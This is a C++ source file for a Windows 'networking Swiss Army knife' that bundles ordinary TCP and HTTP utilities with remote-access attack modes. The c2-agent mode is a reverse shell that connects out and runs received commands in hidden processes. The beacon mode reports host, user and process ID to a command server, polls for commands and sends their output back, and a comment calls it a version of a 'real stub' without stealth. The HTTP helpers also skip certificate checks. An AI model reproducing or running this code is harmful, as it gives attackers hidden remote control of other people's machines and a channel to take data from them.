// Compile: g++ -std=c++17 -o net_toolkit.exe net_toolkit.cpp -lws2_32 -lwininet
// Usage:
//   net_toolkit tcp-client  <host> <port>
//   net_toolkit tcp-server  <port>
//   net_toolkit http-get    <url>
//   net_toolkit http-post   <url> <body>
//   net_toolkit c2-server   <port>
//   net_toolkit c2-agent    <host> <port>
//   net_toolkit beacon      <host> <port> <auth_key>  (HTTP REST beacon — pairs with c2-server/)

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <cstring>

// ── Helpers ───────────────────────────────────────────────────────────────

static bool wsaInit() {
    WSADATA w;
    return WSAStartup(MAKEWORD(2, 2), &w) == 0;
}

static SOCKET tcpConnect(const char* host, int port) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char portStr[8];
    snprintf(portStr, sizeof(portStr), "%d", port);
    if (getaddrinfo(host, portStr, &hints, &res) != 0) return INVALID_SOCKET;
    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s != INVALID_SOCKET && connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        closesocket(s); s = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    return s;
}

static void sendAll(SOCKET s, const std::string& d) {
    int sent = 0, total = (int)d.size();
    while (sent < total) {
        int n = send(s, d.c_str() + sent, total - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
}

// ── TCP Client ────────────────────────────────────────────────────────────

static int modeTcpClient(const char* host, int port) {
    SOCKET s = tcpConnect(host, port);
    if (s == INVALID_SOCKET) {
        printf("[-] Connect %s:%d failed: %d\n", host, port, WSAGetLastError());
        return 1;
    }
    printf("[+] Connected to %s:%d  (type to send, Ctrl+C to exit)\n", host, port);
    std::atomic<bool> alive{true};

    std::thread reader([&] {
        char buf[4096];
        int n;
        while (alive && (n = recv(s, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = '\0';
            printf("%s", buf);
            fflush(stdout);
        }
        alive = false;
    });

    std::string line;
    while (alive && std::getline(std::cin, line)) {
        sendAll(s, line + "\r\n");
    }
    alive = false;
    shutdown(s, SD_BOTH);
    closesocket(s);
    reader.join();
    return 0;
}

// ── TCP Server ────────────────────────────────────────────────────────────

static void handleClient(SOCKET client, int id) {
    char ip[INET6_ADDRSTRLEN] = "?";
    printf("[+] Client #%d connected\n", id);
    char buf[4096];
    int n;
    while ((n = recv(client, buf, sizeof(buf) - 1, 0)) > 0) {
        buf[n] = '\0';
        printf("[#%d] %s", id, buf);
        fflush(stdout);
        sendAll(client, std::string(buf, n)); // echo back
    }
    printf("[-] Client #%d disconnected\n", id);
    closesocket(client);
}

static int modeTcpServer(int port) {
    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    BOOL yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
    struct sockaddr_in sin{};
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons((u_short)port);
    sin.sin_addr.s_addr = INADDR_ANY;
    if (bind(srv, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR) {
        printf("[-] Bind failed: %d\n", WSAGetLastError()); return 1;
    }
    listen(srv, SOMAXCONN);
    printf("[+] Echo server on port %d  (Ctrl+C to stop)\n", port);
    int id = 0;
    while (true) {
        struct sockaddr_in ca{};
        int cl = sizeof(ca);
        SOCKET c = accept(srv, (sockaddr*)&ca, &cl);
        if (c == INVALID_SOCKET) continue;
        char ipbuf[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET, &ca.sin_addr, ipbuf, sizeof(ipbuf));
        printf("[*] Incoming from %s\n", ipbuf);
        std::thread(handleClient, c, ++id).detach();
    }
}

// ── HTTP GET ──────────────────────────────────────────────────────────────

static int modeHttpGet(const char* url) {
    HINTERNET hi = InternetOpenA("net_toolkit/1.0", INTERNET_OPEN_TYPE_DIRECT,
                                  nullptr, nullptr, 0);
    if (!hi) { printf("[-] InternetOpen failed\n"); return 1; }
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (_strnicmp(url, "https", 5) == 0)
        flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
               | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    HINTERNET hu = InternetOpenUrlA(hi, url, nullptr, 0, flags, 0);
    if (!hu) {
        printf("[-] InternetOpenUrl failed: %lu\n", GetLastError());
        InternetCloseHandle(hi); return 1;
    }
    char buf[8192];
    DWORD rd = 0;
    while (InternetReadFile(hu, buf, sizeof(buf) - 1, &rd) && rd > 0) {
        buf[rd] = '\0';
        printf("%s", buf);
    }
    printf("\n");
    InternetCloseHandle(hu);
    InternetCloseHandle(hi);
    return 0;
}

// ── HTTP POST ─────────────────────────────────────────────────────────────

static int modeHttpPost(const char* url, const char* body) {
    URL_COMPONENTSA uc{};
    uc.dwStructSize = sizeof(uc);
    char scheme[16] = {}, host[256] = {}, path[1024] = {};
    uc.lpszScheme      = scheme; uc.dwSchemeLength      = sizeof(scheme);
    uc.lpszHostName    = host;   uc.dwHostNameLength    = sizeof(host);
    uc.lpszUrlPath     = path;   uc.dwUrlPathLength     = sizeof(path);
    if (!InternetCrackUrlA(url, 0, 0, &uc)) {
        printf("[-] URL parse failed\n"); return 1;
    }
    HINTERNET hi = InternetOpenA("net_toolkit/1.0", INTERNET_OPEN_TYPE_DIRECT,
                                  nullptr, nullptr, 0);
    DWORD sf = (_stricmp(scheme, "https") == 0)
             ? INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID : 0;
    int defaultPort = (_stricmp(scheme, "https") == 0) ? 443 : 80;
    HINTERNET hc = InternetConnectA(hi, host,
                       uc.nPort ? uc.nPort : (INTERNET_PORT)defaultPort,
                       nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hr = HttpOpenRequestA(hc, "POST", *path ? path : "/",
                       nullptr, nullptr, nullptr,
                       sf | INTERNET_FLAG_RELOAD, 0);
    const char* hdr = "Content-Type: application/json\r\n";
    HttpAddRequestHeadersA(hr, hdr, (DWORD)-1, HTTP_ADDREQ_FLAG_REPLACE);
    HttpSendRequestA(hr, nullptr, 0, (LPVOID)body, (DWORD)strlen(body));
    char buf[8192];
    DWORD rd = 0;
    while (InternetReadFile(hr, buf, sizeof(buf) - 1, &rd) && rd > 0) {
        buf[rd] = '\0'; printf("%s", buf);
    }
    printf("\n");
    InternetCloseHandle(hr);
    InternetCloseHandle(hc);
    InternetCloseHandle(hi);
    return 0;
}

// ── C2 Server ─────────────────────────────────────────────────────────────

static int modeC2Server(int port) {
    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    BOOL yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET; sin.sin_port = htons((u_short)port);
    sin.sin_addr.s_addr = INADDR_ANY;
    bind(srv, (sockaddr*)&sin, sizeof(sin));
    listen(srv, 5);
    printf("[+] C2 listening on port %d — waiting for agent...\n", port);

    struct sockaddr_in ca{};
    int cl = sizeof(ca);
    SOCKET agent = accept(srv, (sockaddr*)&ca, &cl);
    closesocket(srv);
    if (agent == INVALID_SOCKET) { printf("[-] Accept failed\n"); return 1; }

    // Receive agent ID (hostname sent at connect)
    char id[256] = {};
    int n = recv(agent, id, sizeof(id) - 1, 0);
    if (n > 0) {
        id[n] = '\0';
        int len = (int)strlen(id);
        while (len > 0 && (id[len-1]=='\r'||id[len-1]=='\n')) id[--len]='\0';
    }
    printf("[+] Agent: %s\n\n", id);

    std::string cmd;
    char buf[65536];
    while (true) {
        printf("c2[%s]> ", id); fflush(stdout);
        if (!std::getline(std::cin, cmd) || cmd == "exit") break;
        if (cmd.empty()) continue;
        sendAll(agent, cmd + "\n");

        // Read until sentinel
        std::string result;
        while (true) {
            n = recv(agent, buf, sizeof(buf) - 1, 0);
            if (n <= 0) goto done;
            buf[n] = '\0';
            result += buf;
            if (result.find("__END__\n") != std::string::npos) {
                result.resize(result.find("__END__\n"));
                break;
            }
        }
        printf("%s\n", result.c_str());
    }
done:
    closesocket(agent);
    return 0;
}

// ── Shell exec (CreateProcess + anonymous pipes — no cmd window, captures stderr) ──

static std::string shellExec(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "[pipe error]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{sizeof(si)};
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /c " + cmd;
    char* cmdline = new char[full.size() + 1];
    memcpy(cmdline, full.c_str(), full.size() + 1);

    bool ok = CreateProcessA(nullptr, cmdline, nullptr, nullptr, TRUE,
                              CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi) != 0;
    CloseHandle(hWrite);
    delete[] cmdline;

    std::string out;
    if (ok) {
        char buf[4096]; DWORD rd = 0;
        while (ReadFile(hRead, buf, sizeof(buf) - 1, &rd, nullptr) && rd > 0)
            out.append(buf, rd);
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
    return out.empty() ? "(no output)" : out;
}

// ── C2 Agent (TCP reverse shell using CreateProcess+pipes, no _popen) ────────

static int modeC2Agent(const char* host, int port) {
    while (true) {
        SOCKET s = tcpConnect(host, port);
        if (s == INVALID_SOCKET) {
            printf("[-] Reconnecting in 10s...\n"); Sleep(10000); continue;
        }
        char hn[256] = {}; DWORD sz = sizeof(hn);
        GetComputerNameA(hn, &sz);
        sendAll(s, std::string(hn) + "\n");
        printf("[+] Connected to %s:%d as '%s'\n", host, port, hn);

        char buf[4096]; int n;
        while ((n = recv(s, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = '\0';
            std::string cmd(buf);
            while (!cmd.empty() && (cmd.back()=='\n'||cmd.back()=='\r'||cmd.back()==' '))
                cmd.pop_back();
            if (cmd == "exit") break;

            std::string out = shellExec(cmd);
            out += "\n__END__\n";
            sendAll(s, out);
        }
        closesocket(s);
        printf("[-] Disconnected.\n");
        break;
    }
    return 0;
}

// ── URL encode ────────────────────────────────────────────────────────────────

static std::string urlEncode(const std::string& s) {
    std::string o;
    for (unsigned char c : s) {
        if (isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~') o+=(char)c;
        else { char buf[4]; snprintf(buf,sizeof(buf),"%%%02X",c); o+=buf; }
    }
    return o;
}

// ── Beacon (HTTP REST — pairs with c2-server/ Node.js API) ───────────────────
//
//  GET /checkin?auth=<key>&id=<id>&info=<urlenc>
//  GET /cmd?auth=<key>&id=<id>               → returns command string or ""
//  GET /result?auth=<key>&id=<id>&data=<urlenc>
//
// Demonstrates the exact polling loop the real stub uses but without stealth
// (uses plain HTTP, no compile-time string obfuscation, console window).

static std::string winetGet(const char* host, INTERNET_PORT port, const std::string& path) {
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    HINTERNET hi = InternetOpenA("net_toolkit/1.0", INTERNET_OPEN_TYPE_PRECONFIG,
                                  nullptr, nullptr, 0);
    if (!hi) return "";
    HINTERNET hc = InternetConnectA(hi, host, port, nullptr, nullptr,
                                     INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hr = HttpOpenRequestA(hc, "GET", path.c_str(), nullptr, nullptr,
                                     nullptr, flags, 0);
    std::string result;
    if (HttpSendRequestA(hr, nullptr, 0, nullptr, 0)) {
        char buf[4096]; DWORD rd = 0;
        while (InternetReadFile(hr, buf, sizeof(buf)-1, &rd) && rd > 0)
            result.append(buf, rd);
    }
    InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi);
    return result;
}

static int modeBeacon(const char* host, int port, const char* authKey) {
    char hn[64]={},user[64]={};
    DWORD hs=sizeof(hn),us=sizeof(user);
    GetComputerNameA(hn,&hs); GetUserNameA(user,&us);
    std::string botId = std::string(hn);
    std::string info  = "host=" + botId + "|user=" + std::string(user) + "|pid=" + std::to_string(GetCurrentProcessId());

    printf("[+] Beacon started — %s:%d  auth=%s  id=%s\n", host, port, authKey, botId.c_str());

    while (true) {
        // Checkin
        std::string ciPath = "/checkin?auth=" + std::string(authKey) +
                             "&id=" + urlEncode(botId) + "&info=" + urlEncode(info);
        winetGet(host, (INTERNET_PORT)port, ciPath);

        // Poll for command
        std::string cmdPath = "/cmd?auth=" + std::string(authKey) +
                              "&id=" + urlEncode(botId);
        std::string cmd = winetGet(host, (INTERNET_PORT)port, cmdPath);
        while (!cmd.empty() && (cmd.back()=='\r'||cmd.back()=='\n'||cmd.back()==' '))
            cmd.pop_back();

        if (!cmd.empty()) {
            printf("[*] Got command: %s\n", cmd.c_str());
            std::string out = shellExec(cmd);
            printf("[*] Result (%zu bytes)\n", out.size());
            // Send result
            std::string resPath = "/result?auth=" + std::string(authKey) +
                                  "&id=" + urlEncode(botId) + "&data=" + urlEncode(out);
            winetGet(host, (INTERNET_PORT)port, resPath);

            if (cmd == "uninstall" || cmd == "exit") {
                printf("[+] Uninstall command received — exiting.\n");
                break;
            }
        }

        printf("[.] Polling %s:%d ...\n", host, port);
        Sleep(5000);
    }
    return 0;
}

// ── Entry ─────────────────────────────────────────────────────────────────

static void usage() {
    puts("net_toolkit — Networking Swiss Army Knife\n"
         "  tcp-client  <host> <port>             Interactive TCP client\n"
         "  tcp-server  <port>                    Echo server (threaded)\n"
         "  http-get    <url>                     HTTP/HTTPS GET request\n"
         "  http-post   <url> <body>              HTTP/HTTPS POST request\n"
         "  c2-server   <port>                    TCP raw C2 (waits for one agent)\n"
         "  c2-agent    <host> <port>             TCP reverse shell (CreateProcess+pipes)\n"
         "  beacon      <host> <port> <auth_key>  HTTP REST beacon (c2-server/ API)");
}

int main(int argc, char* argv[]) {
    if (argc < 2) { usage(); return 1; }
    if (!wsaInit()) { puts("[-] WSAStartup failed"); return 1; }

    std::string cmd = argv[1];
    int rc = 1;

    if      (cmd=="tcp-client" && argc==4) rc = modeTcpClient(argv[2], atoi(argv[3]));
    else if (cmd=="tcp-server" && argc==3) rc = modeTcpServer(atoi(argv[2]));
    else if (cmd=="http-get"   && argc==3) rc = modeHttpGet(argv[2]);
    else if (cmd=="http-post"  && argc==4) rc = modeHttpPost(argv[2], argv[3]);
    else if (cmd=="c2-server"  && argc==3) rc = modeC2Server(atoi(argv[2]));
    else if (cmd=="c2-agent"   && argc==4) rc = modeC2Agent(argv[2], atoi(argv[3]));
    else if (cmd=="beacon"     && argc==5) rc = modeBeacon(argv[2], atoi(argv[3]), argv[4]);
    else                                   { usage(); rc = 1; }

    WSACleanup();
    return rc;
}
